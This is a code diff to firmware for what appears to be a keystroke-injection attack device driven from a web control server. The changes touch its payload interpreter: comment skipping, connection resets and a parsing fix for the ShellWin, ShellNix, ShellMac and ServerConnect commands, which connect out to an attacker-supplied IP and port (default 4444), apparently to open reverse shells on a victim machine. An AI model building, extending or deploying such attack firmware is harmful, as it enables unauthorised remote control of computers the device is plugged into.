@@ -916,6 +916,12 @@ void saveLayoutConfig(const String &layout) {
 }
 
 void payloadExec() {
+  cmd.trim();
+  // Skip empty lines and comments
+  if (cmd.length() == 0 || cmd.startsWith("##")) {
+      return;
+  }
+
   if (cmd.startsWith("RunMac ")) {
     cmd.toCharArray(Command, cmd.length() + 1);
     Keyboard.press(KEY_LEFT_GUI);
@@ -1006,9 +1012,15 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("ShellWin ")) {
+    if (clientServer.connected()) {
+        clientServer.stop();
+        delay(100);
+    }
+
     String connectionString = cmd.substring(9);
     String ip;
     int port;
+
     // Parse IP:PORT or use default 4444
     int colonPos = connectionString.indexOf(':');
     if (colonPos == -1) {
@@ -1018,6 +1030,7 @@ void payloadExec() {
         ip = connectionString.substring(0, colonPos);
         port = connectionString.substring(colonPos + 1).toInt();
     }
+
     // Connect with 5 second timeout
     unsigned long startTime = millis();
     bool connected = false;
@@ -1043,9 +1056,15 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("ShellNix ")) {
+    if (clientServer.connected()) {
+        clientServer.stop();
+        delay(100);
+    }
+
     String connectionString = cmd.substring(9);
     String ip;
     int port;
+
     // Parse IP:PORT or use default 4444
     int colonPos = connectionString.indexOf(':');
     if (colonPos == -1) {
@@ -1055,6 +1074,7 @@ void payloadExec() {
         ip = connectionString.substring(0, colonPos);
         port = connectionString.substring(colonPos + 1).toInt();
     }
+
     // Connect with 5 second timeout
     unsigned long startTime = millis();
     bool connected = false;
@@ -1094,7 +1114,12 @@ void payloadExec() {
   }
 
   else if (cmd.startsWith("ServerConnect ")) {
-    String connectionString = cmd.substring(9);
+    if (clientServer.connected()) {
+        clientServer.stop();
+        delay(100);
+    }
+
+    String connectionString = cmd.substring(14);
     String ip;
     int port;
 
@@ -1111,7 +1136,6 @@ void payloadExec() {
     // Connect with 5 second timeout
     unsigned long startTime = millis();
     bool connected = false;
-
     while (!(connected = clientServer.connect(ip.c_str(), port))) {
         if (millis() - startTime >= 5000) {
             return;
@@ -1121,6 +1145,11 @@ void payloadExec() {
   }
   
   else if (cmd.startsWith("ShellMac ")) {
+    if (clientServer.connected()) {
+        clientServer.stop();
+        delay(100);
+    }
+
     String connectionString = cmd.substring(9);
     String ip;
     int port;
@@ -1138,7 +1167,6 @@ void payloadExec() {
     // Connect with 5 second timeout
     unsigned long startTime = millis();
     bool connected = false;
-
     while (!(connected = clientServer.connect(ip.c_str(), port))) {
         if (millis() - startTime >= 5000) {
             return;
@@ -1479,7 +1507,8 @@ void handleLayout() {
 
     if (it != layoutMapInit.end()) {
       Keyboard.setLayout(it->second);
-      saveLayoutConfig(layout);  // Save the layout selection
+      saveLayoutConfig(layout);
+      controlserver.sendHeader("Cache-Control", "no-cache");
       controlserver.send(200, "text/plain", "Layout applied successfully!");
     } else {
       controlserver.send(400, "text/plain", "Invalid layout specified.");
